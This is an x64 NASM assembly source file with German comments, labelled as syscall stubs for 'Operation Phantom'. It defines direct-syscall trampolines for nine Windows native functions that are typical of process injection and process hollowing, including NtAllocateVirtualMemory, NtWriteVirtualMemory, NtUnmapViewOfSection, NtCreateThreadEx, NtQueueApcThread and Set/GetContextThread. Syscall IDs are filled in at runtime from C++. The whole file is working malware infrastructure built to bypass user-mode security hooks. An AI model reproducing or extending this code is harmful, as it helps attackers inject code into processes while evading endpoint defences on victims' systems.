; 
; Syscall Stubs für Operation Phantom (x64)
; Kompilierbar mit NASM: nasm -f win64 syscall_stub.asm -o syscall_stub.obj
;

bits 64
default rel

section .data
    ; Definiere die Syscall-Datenstrukturen hier und exportiere sie.
    ; Die C++ Seite wird diese füllen.
    ; struct SyscallData { DWORD syscall_id; PVOID syscall_address; };
    
    global g_sNtAllocateVirtualMemory
    g_sNtAllocateVirtualMemory:
        dq 0  ; Platz für syscall_id (DWORD) und Padding
    
    global g_sNtWriteVirtualMemory
    g_sNtWriteVirtualMemory:
        dq 0

    global g_sNtCreateThreadEx
    g_sNtCreateThreadEx:
        dq 0

    global g_sNtUnmapViewOfSection
    g_sNtUnmapViewOfSection:
        dq 0

    global g_sNtQueryInformationProcess
    g_sNtQueryInformationProcess:
        dq 0
        
    global g_sNtQueueApcThread
    g_sNtQueueApcThread:
        dq 0

    global g_sNtGetContextThread
    g_sNtGetContextThread:
        dq 0
        
    global g_sNtSetContextThread
    g_sNtSetContextThread:
        dq 0

    global g_sNtResumeThread
    g_sNtResumeThread:
        dq 0

section .text

; --- Globale Symbole exportieren ---
global SyscallNtAllocateVirtualMemory
global SyscallNtWriteVirtualMemory
global SyscallNtCreateThreadEx
global SyscallNtUnmapViewOfSection
global SyscallNtQueryInformationProcess
global SyscallNtQueueApcThread
global SyscallNtGetContextThread
global SyscallNtSetContextThread
global SyscallNtResumeThread

; --- Externe globale Daten entfernt, da sie jetzt lokal definiert sind ---

; --- Trampolin-Implementierungen ---
SyscallNtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, [rel g_sNtAllocateVirtualMemory] ; Verwende nur die ID (erste 4 bytes)
    syscall
    ret

SyscallNtWriteVirtualMemory:
    mov r10, rcx
    mov eax, [rel g_sNtWriteVirtualMemory]
    syscall
    ret

SyscallNtCreateThreadEx:
    mov r10, rcx
    mov eax, [rel g_sNtCreateThreadEx]
    syscall
    ret

SyscallNtUnmapViewOfSection:
    mov r10, rcx
    mov eax, [rel g_sNtUnmapViewOfSection]
    syscall
    ret
    
SyscallNtQueryInformationProcess:
    mov r10, rcx
    mov eax, [rel g_sNtQueryInformationProcess]
    syscall
    ret

SyscallNtQueueApcThread:
    mov r10, rcx
    mov eax, [rel g_sNtQueueApcThread]
    syscall
    ret
    
SyscallNtGetContextThread:
    mov r10, rcx
    mov eax, [rel g_sNtGetContextThread]
    syscall
    ret

SyscallNtSetContextThread:
    mov r10, rcx
    mov eax, [rel g_sNtSetContextThread]
    syscall
    ret

SyscallNtResumeThread:
    mov r10, rcx
    mov eax, [rel g_sNtResumeThread]
    syscall
    ret 